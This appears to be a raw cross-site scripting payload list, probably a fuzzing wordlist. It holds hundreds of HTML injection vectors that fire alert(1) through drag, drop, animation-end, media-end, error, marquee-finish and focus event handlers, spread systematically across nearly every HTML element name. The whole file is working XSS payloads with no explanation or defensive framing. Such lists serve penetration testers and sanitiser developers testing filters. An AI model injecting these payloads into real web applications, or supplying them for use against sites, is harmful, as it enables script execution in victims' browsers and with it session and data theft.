<div draggable="true" contenteditable>drag me</div><ins ondragover=alert(1) contenteditable>drop here</ins>
<div draggable="true" contenteditable>drag me</div><isindex ondragover=alert(1) contenteditable>drop here</isindex>
<div draggable="true" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable>drop here</kbd>
<div draggable="true" contenteditable>drag me</div><keygen ondragover=alert(1) contenteditable>drop here</keygen>
<div draggable="true" contenteditable>drag me</div><label ondragover=alert(1) contenteditable>drop here</label>
<div draggable="true" contenteditable>drag me</div><legend ondragover=alert(1) contenteditable>drop here</legend>
<div draggable="true" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>
<div draggable="true" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>
<div draggable="true" contenteditable>drag me</div><listing ondragover=alert(1) contenteditable>drop here</listing>
<div draggable="true" contenteditable>drag me</div><main ondragover=alert(1) contenteditable>drop here</main>
<div draggable="true" contenteditable>drag me</div><map ondragover=alert(1) contenteditable>drop here</map>
<div draggable="true" contenteditable>drag me</div><mark ondragover=alert(1) contenteditable>drop here</mark>
<div draggable="true" contenteditable>drag me</div><marquee ondragover=alert(1) contenteditable>drop here</marquee>
<div draggable="true" contenteditable>drag me</div><menu ondragover=alert(1) contenteditable>drop here</menu>
<div draggable="true" contenteditable>drag me</div><menuitem ondragover=alert(1) contenteditable>drop here</menuitem>
<div draggable="true" contenteditable>drag me</div><meta ondragover=alert(1) contenteditable>drop here</meta>
<div draggable="true" contenteditable>drag me</div><meter ondragover=alert(1) contenteditable>drop here</meter>
<div draggable="true" contenteditable>drag me</div><multicol ondragover=alert(1) contenteditable>drop here</multicol>
<div draggable="true" contenteditable>drag me</div><nav ondragover=alert(1) contenteditable>drop here</nav>
<div draggable="true" contenteditable>drag me</div><nextid ondragover=alert(1) contenteditable>drop here</nextid>
<div draggable="true" contenteditable>drag me</div><nobr ondragover=alert(1) contenteditable>drop here</nobr>
<div draggable="true" contenteditable>drag me</div><noembed ondragover=alert(1) contenteditable>drop here</noembed>
<div draggable="true" contenteditable>drag me</div><noframes ondragover=alert(1) contenteditable>drop here</noframes>
<div draggable="true" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable>drop here</noscript>
<div draggable="true" contenteditable>drag me</div><object ondragover=alert(1) contenteditable>drop here</object>
<div draggable="true" contenteditable>drag me</div><ol ondragover=alert(1) contenteditable>drop here</ol>
<div draggable="true" contenteditable>drag me</div><optgroup ondragover=alert(1) contenteditable>drop here</optgroup>
<div draggable="true" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>
<div draggable="true" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>
<div draggable="true" contenteditable>drag me</div><p ondragover=alert(1) contenteditable>drop here</p>
<div draggable="true" contenteditable>drag me</div><param ondragover=alert(1) contenteditable>drop here</param>
<div draggable="true" contenteditable>drag me</div><picture ondragover=alert(1) contenteditable>drop here</picture>
<div draggable="true" contenteditable>drag me</div><plaintext ondragover=alert(1) contenteditable>drop here</plaintext>
<div draggable="true" contenteditable>drag me</div><pre ondragover=alert(1) contenteditable>drop here</pre>
<div draggable="true" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable>drop here</progress>
<div draggable="true" contenteditable>drag me</div><q ondragover=alert(1) contenteditable>drop here</q>
<div draggable="true" contenteditable>drag me</div><rb ondragover=alert(1) contenteditable>drop here</rb>
<div draggable="true" contenteditable>drag me</div><rp ondragover=alert(1) contenteditable>drop here</rp>
<div draggable="true" contenteditable>drag me</div><rt ondragover=alert(1) contenteditable>drop here</rt>
<div draggable="true" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable>drop here</rtc>
<div draggable="true" contenteditable>drag me</div><ruby ondragover=alert(1) contenteditable>drop here</ruby>
<div draggable="true" contenteditable>drag me</div><s ondragover=alert(1) contenteditable>drop here</s>
<div draggable="true" contenteditable>drag me</div><samp ondragover=alert(1) contenteditable>drop here</samp>
<div draggable="true" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>
<div draggable="true" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>
<div draggable="true" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>
<div draggable="true" contenteditable>drag me</div><shadow ondragover=alert(1) contenteditable>drop here</shadow>
<div draggable="true" contenteditable>drag me</div><slot ondragover=alert(1) contenteditable>drop here</slot>
<div draggable="true" contenteditable>drag me</div><small ondragover=alert(1) contenteditable>drop here</small>
<div draggable="true" contenteditable>drag me</div><source ondragover=alert(1) contenteditable>drop here</source>
<div draggable="true" contenteditable>drag me</div><spacer ondragover=alert(1) contenteditable>drop here</spacer>
<div draggable="true" contenteditable>drag me</div><span ondragover=alert(1) contenteditable>drop here</span>
<div draggable="true" contenteditable>drag me</div><strike ondragover=alert(1) contenteditable>drop here</strike>
<div draggable="true" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>
<div draggable="true" contenteditable>drag me</div><style ondragover=alert(1) contenteditable>drop here</style>
<div draggable="true" contenteditable>drag me</div><sub ondragover=alert(1) contenteditable>drop here</sub>
<div draggable="true" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>
<div draggable="true" contenteditable>drag me</div><sup ondragover=alert(1) contenteditable>drop here</sup>
<div draggable="true" contenteditable>drag me</div><svg ondragover=alert(1) contenteditable>drop here</svg>
<div draggable="true" contenteditable>drag me</div><table ondragover=alert(1) contenteditable>drop here</table>
<div draggable="true" contenteditable>drag me</div><tbody ondragover=alert(1) contenteditable>drop here</tbody>
<div draggable="true" contenteditable>drag me</div><td ondragover=alert(1) contenteditable>drop here</td>
<div draggable="true" contenteditable>drag me</div><template ondragover=alert(1) contenteditable>drop here</template>
<div draggable="true" contenteditable>drag me</div><textarea ondragover=alert(1) contenteditable>drop here</textarea>
<div draggable="true" contenteditable>drag me</div><tfoot ondragover=alert(1) contenteditable>drop here</tfoot>
<div draggable="true" contenteditable>drag me</div><th ondragover=alert(1) contenteditable>drop here</th>
<div draggable="true" contenteditable>drag me</div><thead ondragover=alert(1) contenteditable>drop here</thead>
<div draggable="true" contenteditable>drag me</div><time ondragover=alert(1) contenteditable>drop here</time>
<div draggable="true" contenteditable>drag me</div><title ondragover=alert(1) contenteditable>drop here</title>
<div draggable="true" contenteditable>drag me</div><tr ondragover=alert(1) contenteditable>drop here</tr>
<div draggable="true" contenteditable>drag me</div><track ondragover=alert(1) contenteditable>drop here</track>
<div draggable="true" contenteditable>drag me</div><tt ondragover=alert(1) contenteditable>drop here</tt>
<div draggable="true" contenteditable>drag me</div><u ondragover=alert(1) contenteditable>drop here</u>
<div draggable="true" contenteditable>drag me</div><ul ondragover=alert(1) contenteditable>drop here</ul>
<div draggable="true" contenteditable>drag me</div><var ondragover=alert(1) contenteditable>drop here</var>
<div draggable="true" contenteditable>drag me</div><video ondragover=alert(1) contenteditable>drop here</video>
<div draggable="true" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable>drop here</wbr>
<div draggable="true" contenteditable>drag me</div><xmp ondragover=alert(1) contenteditable>drop here</xmp>
<a draggable="true" ondragstart="alert(1)">test</a>
<abbr draggable="true" ondragstart="alert(1)">test</abbr>
<acronym draggable="true" ondragstart="alert(1)">test</acronym>
<address draggable="true" ondragstart="alert(1)">test</address>
<applet draggable="true" ondragstart="alert(1)">test</applet>
<area draggable="true" ondragstart="alert(1)">test</area>
<article draggable="true" ondragstart="alert(1)">test</article>
<aside draggable="true" ondragstart="alert(1)">test</aside>
<audio draggable="true" ondragstart="alert(1)">test</audio>
<b draggable="true" ondragstart="alert(1)">test</b>
<base draggable="true" ondragstart="alert(1)">test</base>
<basefont draggable="true" ondragstart="alert(1)">test</basefont>
<bdi draggable="true" ondragstart="alert(1)">test</bdi>
<bdo draggable="true" ondragstart="alert(1)">test</bdo>
<bgsound draggable="true" ondragstart="alert(1)">test</bgsound>
<big draggable="true" ondragstart="alert(1)">test</big>
<blink draggable="true" ondragstart="alert(1)">test</blink>
<blockquote draggable="true" ondragstart="alert(1)">test</blockquote>
<body draggable="true" ondragstart="alert(1)">test</body>
<br draggable="true" ondragstart="alert(1)">test</br>
<button draggable="true" ondragstart="alert(1)">test</button>
<canvas draggable="true" ondragstart="alert(1)">test</canvas>
<caption draggable="true" ondragstart="alert(1)">test</caption>
<center draggable="true" ondragstart="alert(1)">test</center>
<cite draggable="true" ondragstart="alert(1)">test</cite>
<code draggable="true" ondragstart="alert(1)">test</code>
<col draggable="true" ondragstart="alert(1)">test</col>
<colgroup draggable="true" ondragstart="alert(1)">test</colgroup>
<command draggable="true" ondragstart="alert(1)">test</command>
<content draggable="true" ondragstart="alert(1)">test</content>
<data draggable="true" ondragstart="alert(1)">test</data>
<datalist draggable="true" ondragstart="alert(1)">test</datalist>
<dd draggable="true" ondragstart="alert(1)">test</dd>
<del draggable="true" ondragstart="alert(1)">test</del>
<details draggable="true" ondragstart="alert(1)">test</details>
<dfn draggable="true" ondragstart="alert(1)">test</dfn>
<dialog draggable="true" ondragstart="alert(1)">test</dialog>
<dir draggable="true" ondragstart="alert(1)">test</dir>
<div draggable="true" ondragstart="alert(1)">test</div>
<dl draggable="true" ondragstart="alert(1)">test</dl>
<dt draggable="true" ondragstart="alert(1)">test</dt>
<element draggable="true" ondragstart="alert(1)">test</element>
<em draggable="true" ondragstart="alert(1)">test</em>
<embed draggable="true" ondragstart="alert(1)">test</embed>
<fieldset draggable="true" ondragstart="alert(1)">test</fieldset>
<figcaption draggable="true" ondragstart="alert(1)">test</figcaption>
<figure draggable="true" ondragstart="alert(1)">test</figure>
<font draggable="true" ondragstart="alert(1)">test</font>
<footer draggable="true" ondragstart="alert(1)">test</footer>
<form draggable="true" ondragstart="alert(1)">test</form>
<frame draggable="true" ondragstart="alert(1)">test</frame>
<frameset draggable="true" ondragstart="alert(1)">test</frameset>
<h1 draggable="true" ondragstart="alert(1)">test</h1>
<head draggable="true" ondragstart="alert(1)">test</head>
<header draggable="true" ondragstart="alert(1)">test</header>
<hgroup draggable="true" ondragstart="alert(1)">test</hgroup>
<hr draggable="true" ondragstart="alert(1)">test</hr>
<html draggable="true" ondragstart="alert(1)">test</html>
<i draggable="true" ondragstart="alert(1)">test</i>
<iframe draggable="true" ondragstart="alert(1)">test</iframe>
<image draggable="true" ondragstart="alert(1)">test</image>
<img draggable="true" ondragstart="alert(1)">test</img>
<input draggable="true" ondragstart="alert(1)">test</input>
<ins draggable="true" ondragstart="alert(1)">test</ins>
<isindex draggable="true" ondragstart="alert(1)">test</isindex>
<kbd draggable="true" ondragstart="alert(1)">test</kbd>
<keygen draggable="true" ondragstart="alert(1)">test</keygen>
<label draggable="true" ondragstart="alert(1)">test</label>
<legend draggable="true" ondragstart="alert(1)">test</legend>
<li draggable="true" ondragstart="alert(1)">test</li>
<link draggable="true" ondragstart="alert(1)">test</link>
<listing draggable="true" ondragstart="alert(1)">test</listing>
<main draggable="true" ondragstart="alert(1)">test</main>
<map draggable="true" ondragstart="alert(1)">test</map>
<mark draggable="true" ondragstart="alert(1)">test</mark>
<marquee draggable="true" ondragstart="alert(1)">test</marquee>
<menu draggable="true" ondragstart="alert(1)">test</menu>
<menuitem draggable="true" ondragstart="alert(1)">test</menuitem>
<meta draggable="true" ondragstart="alert(1)">test</meta>
<meter draggable="true" ondragstart="alert(1)">test</meter>
<multicol draggable="true" ondragstart="alert(1)">test</multicol>
<nav draggable="true" ondragstart="alert(1)">test</nav>
<nextid draggable="true" ondragstart="alert(1)">test</nextid>
<nobr draggable="true" ondragstart="alert(1)">test</nobr>
<noembed draggable="true" ondragstart="alert(1)">test</noembed>
<noframes draggable="true" ondragstart="alert(1)">test</noframes>
<noscript draggable="true" ondragstart="alert(1)">test</noscript>
<object draggable="true" ondragstart="alert(1)">test</object>
<ol draggable="true" ondragstart="alert(1)">test</ol>
<optgroup draggable="true" ondragstart="alert(1)">test</optgroup>
<option draggable="true" ondragstart="alert(1)">test</option>
<output draggable="true" ondragstart="alert(1)">test</output>
<p draggable="true" ondragstart="alert(1)">test</p>
<param draggable="true" ondragstart="alert(1)">test</param>
<picture draggable="true" ondragstart="alert(1)">test</picture>
<plaintext draggable="true" ondragstart="alert(1)">test</plaintext>
<pre draggable="true" ondragstart="alert(1)">test</pre>
<progress draggable="true" ondragstart="alert(1)">test</progress>
<q draggable="true" ondragstart="alert(1)">test</q>
<rb draggable="true" ondragstart="alert(1)">test</rb>
<rp draggable="true" ondragstart="alert(1)">test</rp>
<rt draggable="true" ondragstart="alert(1)">test</rt>
<rtc draggable="true" ondragstart="alert(1)">test</rtc>
<ruby draggable="true" ondragstart="alert(1)">test</ruby>
<s draggable="true" ondragstart="alert(1)">test</s>
<samp draggable="true" ondragstart="alert(1)">test</samp>
<script draggable="true" ondragstart="alert(1)">test</script>
<section draggable="true" ondragstart="alert(1)">test</section>
<select draggable="true" ondragstart="alert(1)">test</select>
<shadow draggable="true" ondragstart="alert(1)">test</shadow>
<slot draggable="true" ondragstart="alert(1)">test</slot>
<small draggable="true" ondragstart="alert(1)">test</small>
<source draggable="true" ondragstart="alert(1)">test</source>
<spacer draggable="true" ondragstart="alert(1)">test</spacer>
<span draggable="true" ondragstart="alert(1)">test</span>
<strike draggable="true" ondragstart="alert(1)">test</strike>
<strong draggable="true" ondragstart="alert(1)">test</strong>
<style draggable="true" ondragstart="alert(1)">test</style>
<sub draggable="true" ondragstart="alert(1)">test</sub>
<summary draggable="true" ondragstart="alert(1)">test</summary>
<sup draggable="true" ondragstart="alert(1)">test</sup>
<svg draggable="true" ondragstart="alert(1)">test</svg>
<table draggable="true" ondragstart="alert(1)">test</table>
<tbody draggable="true" ondragstart="alert(1)">test</tbody>
<td draggable="true" ondragstart="alert(1)">test</td>
<template draggable="true" ondragstart="alert(1)">test</template>
<textarea draggable="true" ondragstart="alert(1)">test</textarea>
<tfoot draggable="true" ondragstart="alert(1)">test</tfoot>
<th draggable="true" ondragstart="alert(1)">test</th>
<thead draggable="true" ondragstart="alert(1)">test</thead>
<time draggable="true" ondragstart="alert(1)">test</time>
<title draggable="true" ondragstart="alert(1)">test</title>
<tr draggable="true" ondragstart="alert(1)">test</tr>
<track draggable="true" ondragstart="alert(1)">test</track>
<tt draggable="true" ondragstart="alert(1)">test</tt>
<u draggable="true" ondragstart="alert(1)">test</u>
<ul draggable="true" ondragstart="alert(1)">test</ul>
<var draggable="true" ondragstart="alert(1)">test</var>
<video draggable="true" ondragstart="alert(1)">test</video>
<wbr draggable="true" ondragstart="alert(1)">test</wbr>
<xmp draggable="true" ondragstart="alert(1)">test</xmp>
<div draggable="true" contenteditable>drag me</div><a ondrop=alert(1) contenteditable>drop here</a>
<div draggable="true" contenteditable>drag me</div><abbr ondrop=alert(1) contenteditable>drop here</abbr>
<div draggable="true" contenteditable>drag me</div><acronym ondrop=alert(1) contenteditable>drop here</acronym>
<div draggable="true" contenteditable>drag me</div><address ondrop=alert(1) contenteditable>drop here</address>
<div draggable="true" contenteditable>drag me</div><applet ondrop=alert(1) contenteditable>drop here</applet>
<div draggable="true" contenteditable>drag me</div><area ondrop=alert(1) contenteditable>drop here</area>
<div draggable="true" contenteditable>drag me</div><article ondrop=alert(1) contenteditable>drop here</article>
<div draggable="true" contenteditable>drag me</div><aside ondrop=alert(1) contenteditable>drop here</aside>
<div draggable="true" contenteditable>drag me</div><audio ondrop=alert(1) contenteditable>drop here</audio>
<div draggable="true" contenteditable>drag me</div><b ondrop=alert(1) contenteditable>drop here</b>
<div draggable="true" contenteditable>drag me</div><base ondrop=alert(1) contenteditable>drop here</base>
<div draggable="true" contenteditable>drag me</div><basefont ondrop=alert(1) contenteditable>drop here</basefont>
<div draggable="true" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>
<div draggable="true" contenteditable>drag me</div><bdo ondrop=alert(1) contenteditable>drop here</bdo>
<div draggable="true" contenteditable>drag me</div><bgsound ondrop=alert(1) contenteditable>drop here</bgsound>
<div draggable="true" contenteditable>drag me</div><big ondrop=alert(1) contenteditable>drop here</big>
<div draggable="true" contenteditable>drag me</div><blink ondrop=alert(1) contenteditable>drop here</blink>
<div draggable="true" contenteditable>drag me</div><blockquote ondrop=alert(1) contenteditable>drop here</blockquote>
<div draggable="true" contenteditable>drag me</div><body ondrop=alert(1) contenteditable>drop here</body>
<div draggable="true" contenteditable>drag me</div><br ondrop=alert(1) contenteditable>drop here</br>
<div draggable="true" contenteditable>drag me</div><button ondrop=alert(1) contenteditable>drop here</button>
<div draggable="true" contenteditable>drag me</div><canvas ondrop=alert(1) contenteditable>drop here</canvas>
<div draggable="true" contenteditable>drag me</div><caption ondrop=alert(1) contenteditable>drop here</caption>
<div draggable="true" contenteditable>drag me</div><center ondrop=alert(1) contenteditable>drop here</center>
<div draggable="true" contenteditable>drag me</div><cite ondrop=alert(1) contenteditable>drop here</cite>
<div draggable="true" contenteditable>drag me</div><code ondrop=alert(1) contenteditable>drop here</code>
<div draggable="true" contenteditable>drag me</div><col ondrop=alert(1) contenteditable>drop here</col>
<div draggable="true" contenteditable>drag me</div><colgroup ondrop=alert(1) contenteditable>drop here</colgroup>
<div draggable="true" contenteditable>drag me</div><command ondrop=alert(1) contenteditable>drop here</command>
<div draggable="true" contenteditable>drag me</div><content ondrop=alert(1) contenteditable>drop here</content>
<div draggable="true" contenteditable>drag me</div><data ondrop=alert(1) contenteditable>drop here</data>
<div draggable="true" contenteditable>drag me</div><datalist ondrop=alert(1) contenteditable>drop here</datalist>
<div draggable="true" contenteditable>drag me</div><dd ondrop=alert(1) contenteditable>drop here</dd>
<div draggable="true" contenteditable>drag me</div><del ondrop=alert(1) contenteditable>drop here</del>
<div draggable="true" contenteditable>drag me</div><details ondrop=alert(1) contenteditable>drop here</details>
<div draggable="true" contenteditable>drag me</div><dfn ondrop=alert(1) contenteditable>drop here</dfn>
<div draggable="true" contenteditable>drag me</div><dialog ondrop=alert(1) contenteditable>drop here</dialog>
<div draggable="true" contenteditable>drag me</div><dir ondrop=alert(1) contenteditable>drop here</dir>
<div draggable="true" contenteditable>drag me</div><div ondrop=alert(1) contenteditable>drop here</div>
<div draggable="true" contenteditable>drag me</div><dl ondrop=alert(1) contenteditable>drop here</dl>
<div draggable="true" contenteditable>drag me</div><dt ondrop=alert(1) contenteditable>drop here</dt>
<div draggable="true" contenteditable>drag me</div><element ondrop=alert(1) contenteditable>drop here</element>
<div draggable="true" contenteditable>drag me</div><em ondrop=alert(1) contenteditable>drop here</em>
<div draggable="true" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable>drop here</embed>
<div draggable="true" contenteditable>drag me</div><fieldset ondrop=alert(1) contenteditable>drop here</fieldset>
<div draggable="true" contenteditable>drag me</div><figcaption ondrop=alert(1) contenteditable>drop here</figcaption>
<div draggable="true" contenteditable>drag me</div><figure ondrop=alert(1) contenteditable>drop here</figure>
<div draggable="true" contenteditable>drag me</div><font ondrop=alert(1) contenteditable>drop here</font>
<div draggable="true" contenteditable>drag me</div><footer ondrop=alert(1) contenteditable>drop here</footer>
<div draggable="true" contenteditable>drag me</div><form ondrop=alert(1) contenteditable>drop here</form>
<div draggable="true" contenteditable>drag me</div><frame ondrop=alert(1) contenteditable>drop here</frame>
<div draggable="true" contenteditable>drag me</div><frameset ondrop=alert(1) contenteditable>drop here</frameset>
<div draggable="true" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>
<div draggable="true" contenteditable>drag me</div><head ondrop=alert(1) contenteditable>drop here</head>
<div draggable="true" contenteditable>drag me</div><header ondrop=alert(1) contenteditable>drop here</header>
<div draggable="true" contenteditable>drag me</div><hgroup ondrop=alert(1) contenteditable>drop here</hgroup>
<div draggable="true" contenteditable>drag me</div><hr ondrop=alert(1) contenteditable>drop here</hr>
<div draggable="true" contenteditable>drag me</div><html ondrop=alert(1) contenteditable>drop here</html>
<div draggable="true" contenteditable>drag me</div><i ondrop=alert(1) contenteditable>drop here</i>
<div draggable="true" contenteditable>drag me</div><iframe ondrop=alert(1) contenteditable>drop here</iframe>
<div draggable="true" contenteditable>drag me</div><image ondrop=alert(1) contenteditable>drop here</image>
<div draggable="true" contenteditable>drag me</div><img ondrop=alert(1) contenteditable>drop here</img>
<div draggable="true" contenteditable>drag me</div><input ondrop=alert(1) contenteditable>drop here</input>
<div draggable="true" contenteditable>drag me</div><ins ondrop=alert(1) contenteditable>drop here</ins>
<div draggable="true" contenteditable>drag me</div><isindex ondrop=alert(1) contenteditable>drop here</isindex>
<div draggable="true" contenteditable>drag me</div><kbd ondrop=alert(1) contenteditable>drop here</kbd>
<div draggable="true" contenteditable>drag me</div><keygen ondrop=alert(1) contenteditable>drop here</keygen>
<div draggable="true" contenteditable>drag me</div><label ondrop=alert(1) contenteditable>drop here</label>
<div draggable="true" contenteditable>drag me</div><legend ondrop=alert(1) contenteditable>drop here</legend>
<div draggable="true" contenteditable>drag me</div><li ondrop=alert(1) contenteditable>drop here</li>
<div draggable="true" contenteditable>drag me</div><link ondrop=alert(1) contenteditable>drop here</link>
<div draggable="true" contenteditable>drag me</div><listing ondrop=alert(1) contenteditable>drop here</listing>
<div draggable="true" contenteditable>drag me</div><main ondrop=alert(1) contenteditable>drop here</main>
<div draggable="true" contenteditable>drag me</div><map ondrop=alert(1) contenteditable>drop here</map>
<div draggable="true" contenteditable>drag me</div><mark ondrop=alert(1) contenteditable>drop here</mark>
<div draggable="true" contenteditable>drag me</div><marquee ondrop=alert(1) contenteditable>drop here</marquee>
<div draggable="true" contenteditable>drag me</div><menu ondrop=alert(1) contenteditable>drop here</menu>
<div draggable="true" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>
<div draggable="true" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable>drop here</meta>
<div draggable="true" contenteditable>drag me</div><meter ondrop=alert(1) contenteditable>drop here</meter>
<div draggable="true" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable>drop here</multicol>
<div draggable="true" contenteditable>drag me</div><nav ondrop=alert(1) contenteditable>drop here</nav>
<div draggable="true" contenteditable>drag me</div><nextid ondrop=alert(1) contenteditable>drop here</nextid>
<div draggable="true" contenteditable>drag me</div><nobr ondrop=alert(1) contenteditable>drop here</nobr>
<div draggable="true" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>
<div draggable="true" contenteditable>drag me</div><noframes ondrop=alert(1) contenteditable>drop here</noframes>
<div draggable="true" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable>drop here</noscript>
<div draggable="true" contenteditable>drag me</div><object ondrop=alert(1) contenteditable>drop here</object>
<div draggable="true" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>
<div draggable="true" contenteditable>drag me</div><optgroup ondrop=alert(1) contenteditable>drop here</optgroup>
<div draggable="true" contenteditable>drag me</div><option ondrop=alert(1) contenteditable>drop here</option>
<div draggable="true" contenteditable>drag me</div><output ondrop=alert(1) contenteditable>drop here</output>
<div draggable="true" contenteditable>drag me</div><p ondrop=alert(1) contenteditable>drop here</p>
<div draggable="true" contenteditable>drag me</div><param ondrop=alert(1) contenteditable>drop here</param>
<div draggable="true" contenteditable>drag me</div><picture ondrop=alert(1) contenteditable>drop here</picture>
<div draggable="true" contenteditable>drag me</div><plaintext ondrop=alert(1) contenteditable>drop here</plaintext>
<div draggable="true" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>
<div draggable="true" contenteditable>drag me</div><progress ondrop=alert(1) contenteditable>drop here</progress>
<div draggable="true" contenteditable>drag me</div><q ondrop=alert(1) contenteditable>drop here</q>
<div draggable="true" contenteditable>drag me</div><rb ondrop=alert(1) contenteditable>drop here</rb>
<div draggable="true" contenteditable>drag me</div><rp ondrop=alert(1) contenteditable>drop here</rp>
<div draggable="true" contenteditable>drag me</div><rt ondrop=alert(1) contenteditable>drop here</rt>
<div draggable="true" contenteditable>drag me</div><rtc ondrop=alert(1) contenteditable>drop here</rtc>
<div draggable="true" contenteditable>drag me</div><ruby ondrop=alert(1) contenteditable>drop here</ruby>
<div draggable="true" contenteditable>drag me</div><s ondrop=alert(1) contenteditable>drop here</s>
<div draggable="true" contenteditable>drag me</div><samp ondrop=alert(1) contenteditable>drop here</samp>
<div draggable="true" contenteditable>drag me</div><script ondrop=alert(1) contenteditable>drop here</script>
<div draggable="true" contenteditable>drag me</div><section ondrop=alert(1) contenteditable>drop here</section>
<div draggable="true" contenteditable>drag me</div><select ondrop=alert(1) contenteditable>drop here</select>
<div draggable="true" contenteditable>drag me</div><shadow ondrop=alert(1) contenteditable>drop here</shadow>
<div draggable="true" contenteditable>drag me</div><slot ondrop=alert(1) contenteditable>drop here</slot>
<div draggable="true" contenteditable>drag me</div><small ondrop=alert(1) contenteditable>drop here</small>
<div draggable="true" contenteditable>drag me</div><source ondrop=alert(1) contenteditable>drop here</source>
<div draggable="true" contenteditable>drag me</div><spacer ondrop=alert(1) contenteditable>drop here</spacer>
<div draggable="true" contenteditable>drag me</div><span ondrop=alert(1) contenteditable>drop here</span>
<div draggable="true" contenteditable>drag me</div><strike ondrop=alert(1) contenteditable>drop here</strike>
<div draggable="true" contenteditable>drag me</div><strong ondrop=alert(1) contenteditable>drop here</strong>
<div draggable="true" contenteditable>drag me</div><style ondrop=alert(1) contenteditable>drop here</style>
<div draggable="true" contenteditable>drag me</div><sub ondrop=alert(1) contenteditable>drop here</sub>
<div draggable="true" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable>drop here</summary>
<div draggable="true" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>
<div draggable="true" contenteditable>drag me</div><svg ondrop=alert(1) contenteditable>drop here</svg>
<div draggable="true" contenteditable>drag me</div><table ondrop=alert(1) contenteditable>drop here</table>
<div draggable="true" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable>drop here</tbody>
<div draggable="true" contenteditable>drag me</div><td ondrop=alert(1) contenteditable>drop here</td>
<div draggable="true" contenteditable>drag me</div><template ondrop=alert(1) contenteditable>drop here</template>
<div draggable="true" contenteditable>drag me</div><textarea ondrop=alert(1) contenteditable>drop here</textarea>
<div draggable="true" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable>drop here</tfoot>
<div draggable="true" contenteditable>drag me</div><th ondrop=alert(1) contenteditable>drop here</th>
<div draggable="true" contenteditable>drag me</div><thead ondrop=alert(1) contenteditable>drop here</thead>
<div draggable="true" contenteditable>drag me</div><time ondrop=alert(1) contenteditable>drop here</time>
<div draggable="true" contenteditable>drag me</div><title ondrop=alert(1) contenteditable>drop here</title>
<div draggable="true" contenteditable>drag me</div><tr ondrop=alert(1) contenteditable>drop here</tr>
<div draggable="true" contenteditable>drag me</div><track ondrop=alert(1) contenteditable>drop here</track>
<div draggable="true" contenteditable>drag me</div><tt ondrop=alert(1) contenteditable>drop here</tt>
<div draggable="true" contenteditable>drag me</div><u ondrop=alert(1) contenteditable>drop here</u>
<div draggable="true" contenteditable>drag me</div><ul ondrop=alert(1) contenteditable>drop here</ul>
<div draggable="true" contenteditable>drag me</div><var ondrop=alert(1) contenteditable>drop here</var>
<div draggable="true" contenteditable>drag me</div><video ondrop=alert(1) contenteditable>drop here</video>
<div draggable="true" contenteditable>drag me</div><wbr ondrop=alert(1) contenteditable>drop here</wbr>
<div draggable="true" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable>drop here</xmp>
<svg><animate onend=alert(1) attributeName=x dur=1s>
<svg><path><animateMotion onend=alert(1) dur=1s repeatCount=1>
<svg><animatetransform onend=alert(1) attributeName=transform dur=1s>
<svg><set onend=alert(1) attributename=x dur=1s>
<video controls autoplay onended=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
<body onerror=alert(1) onload=/>
<script onerror=alert(1) src=/></script>
<link rel=stylesheet href=1 onerror=alert(1)>
<img src/onerror=alert(1)>
<img srcset=1 onerror=alert(1)>
<image src/onerror=alert(1)>
<image srcset=1 onerror=alert(1)>
<svg><image href=1 onerror=alert(1)>
<input type=image src=1 onerror=alert(1)>
<video src/onerror=alert(1)>
<video><source onerror=alert(1) src=1></video>
<audio src/onerror=alert(1)>
<object onerror=alert(1) data=1 type=image/gif>
<isindex type=image src=1 onerror=alert(1)>
<embed src=1 onerror=alert(1) type=image/gif>
<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>test</textarea>
<button autofocus onfocus=alert(1)>test</button>
<input id=x onfocus=alert(1)>
<input type=checkbox id=x onfocus=alert(1)>
<input type=radio id=x onfocus=alert(1)>
<img usemap=#x><map name="x"><area href onfocus=alert(1) id=x>
<iframe id=x onfocus=alert(1)>
<frameset><frame id=x onfocus=alert(1)>
<embed id=x onfocus=alert(1) type=text/html>
<object id=x onfocus=alert(1) type=text/html>
<svg id=x onfocus=alert(1)>
<keygen id=x onfocus=alert(1)>
<video id=x controls onfocus=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
<audio id=x controls onfocus=alert(1) id=x><source src="validaudio.wav"></audio>
<link onfocus=alert(1) id=x tabindex=1 style=display:block>
<keygen autofocus onfocus=alert(1)>
<a id=x tabindex=1 onfocus=alert(1)></a>
<abbr id=x tabindex=1 onfocus=alert(1)></abbr>
<acronym id=x tabindex=1 onfocus=alert(1)></acronym>
<address id=x tabindex=1 onfocus=alert(1)></address>
<applet id=x tabindex=1 onfocus=alert(1)></applet>
<article id=x tabindex=1 onfocus=alert(1)></article>
<aside id=x tabindex=1 onfocus=alert(1)></aside>
